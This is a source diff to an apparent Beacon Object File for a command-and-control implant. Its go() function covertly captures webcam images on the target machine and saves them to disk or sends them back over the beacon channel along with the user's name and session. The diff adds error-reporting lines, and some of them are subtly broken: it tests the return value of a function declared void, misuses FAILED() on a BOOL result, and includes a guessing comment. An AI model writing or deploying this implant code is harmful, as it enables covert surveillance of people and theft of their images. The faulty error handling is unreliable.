@@ -1539,6 +1539,8 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
 
     free(packedData);
 }
+
+
 void go(char* buff, int len) {
     datap parser;
     BeaconDataParse(&parser, buff, len);
@@ -1546,39 +1548,61 @@ void go(char* buff, int len) {
     char* filename = BeaconDataExtract(&parser, NULL);
     int savemethod = BeaconDataInt(&parser);
 
-    if (!ResolveAPIs() || !ResolveGDIs()) {
+    if (!ResolveAPIs()) {
+        BeaconPrintf(CALLBACK_OUTPUT, "ResolveAPIs failed: %s", filename);
+        return;
+    }
+    if (!ResolveGDIs()) {
+        BeaconPrintf(CALLBACK_OUTPUT, "ResolveGDIs failed: %s", filename);
         return;
     }
     
-    if(FAILED(pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED))){
+    HRESULT hr = pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "pCoInitializeEx failed: %s", filename);
         return;
     }
+    
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing webcam");
     CWebcamAccess wa;
     CWebcamAccess_Init(&wa);
-
-    if (FAILED(CWebcamAccess_Initialize(&wa))) {
+    
+    hr = CWebcamAccess_Initialize(&wa);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_Initialize failed: %s", filename);
         CWebcamAccess_Destroy(&wa);
         return;
     }
 
-    if (FAILED(CWebcamAccess_PrepareDevice(&wa))) {
+    hr = CWebcamAccess_PrepareDevice(&wa);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_PrepareDevice failed: %s", filename);
         CWebcamAccess_Destroy(&wa);
         return;
     }
 
-    unsigned int width, height;
-    CWebcamAccess_GetImageSizes(&wa, &width, &height);
-
+    unsigned int width = 0, height = 0;
+    // Assuming CWebcamAccess_GetImageSizes returns an HRESULT; otherwise, adjust as needed.
+    hr = CWebcamAccess_GetImageSizes(&wa, &width, &height);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_GetImageSizes failed: %s", filename);
+        CWebcamAccess_Destroy(&wa);
+        return;
+    }
+    
     int buflen = width * height * 4;
     BYTE* buf = (BYTE*)malloc(buflen);
     if (!buf) {
+        BeaconPrintf(CALLBACK_OUTPUT, "malloc failed: %s", filename);
         CWebcamAccess_Destroy(&wa);
         return;
     }
+    
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Capturing image data");
-
-    if(FAILED(CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, width * -4))){
+    hr = CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, width * -4);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "CWebcamAccess_GetImageData failed: %s", filename);
+        free(buf);
         CWebcamAccess_Destroy(&wa);
         return;
     }
@@ -1594,6 +1618,7 @@ void go(char* buff, int len) {
     void* pBits = NULL;
     HBITMAP hBitmap = pCreateDIBSection(NULL, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
     if (!hBitmap) {
+        BeaconPrintf(CALLBACK_OUTPUT, "pCreateDIBSection failed: %s", filename);
         free(buf);
         CWebcamAccess_Destroy(&wa);
         return;
@@ -1605,6 +1630,7 @@ void go(char* buff, int len) {
     DWORD jpegSize = 0;
     int quality = 90;
     if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "BitmapToJpeg failed: %s", filename);
         DeleteObject(hBitmap);
         free(buf);
         CWebcamAccess_Destroy(&wa);
@@ -1614,28 +1640,43 @@ void go(char* buff, int len) {
     if (savemethod == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Saving JPEG to disk with filename %s", filename);
         HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
+        if (hFile == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_OUTPUT, "CreateFileA failed: %s", filename);
+        }
+        else {
             DWORD bytesWritten = 0;
-            WriteFile(hFile, jpegData, jpegSize, &bytesWritten, NULL);
+            if (!WriteFile(hFile, jpegData, jpegSize, &bytesWritten, NULL)) {
+                BeaconPrintf(CALLBACK_OUTPUT, "WriteFile failed: %s", filename);
+            }
             CloseHandle(hFile);
         }
-    } 
+    }
     else if (savemethod == 1) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a file with filename %s", filename);
-        downloadFile(filename, (int)strlen(filename), (char*)jpegData, (int)jpegSize);
-    } 
+        if (!downloadFile(filename, (int)strlen(filename), (char*)jpegData, (int)jpegSize)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "downloadFile failed: %s", filename);
+        }
+    }
     else if (savemethod == 2) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Downloading JPEG over beacon as a screenshot");
         DWORD session = -1;
         if (pGetCurrentProcessId && pProcessIdToSessionId) {
-            pProcessIdToSessionId(pGetCurrentProcessId(), &session);
+            hr = pProcessIdToSessionId(pGetCurrentProcessId(), &session);
+            if (FAILED(hr)) {
+                BeaconPrintf(CALLBACK_OUTPUT, "pProcessIdToSessionId failed: %s", filename);
+            }
         }
         char* user = (char*)pgetenv("USERNAME");
+        if (!user) {
+            BeaconPrintf(CALLBACK_OUTPUT, "pgetenv failed: %s", filename);
+            user = "Unknown";
+        }
         char title[] = "Webcam";
         int userLength = MSVCRT$_snprintf(NULL, 0, "%s", user);
         int titleLength = MSVCRT$_snprintf(NULL, 0, "%s", title);
-
-        downloadScreenshot((char*)jpegData, (int)jpegSize, session, title, titleLength, user, userLength);
+        if (!downloadScreenshot((char*)jpegData, (int)jpegSize, session, title, titleLength, user, userLength)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "downloadScreenshot failed: %s", filename);
+        }
     }
 
     DeleteObject(hBitmap);
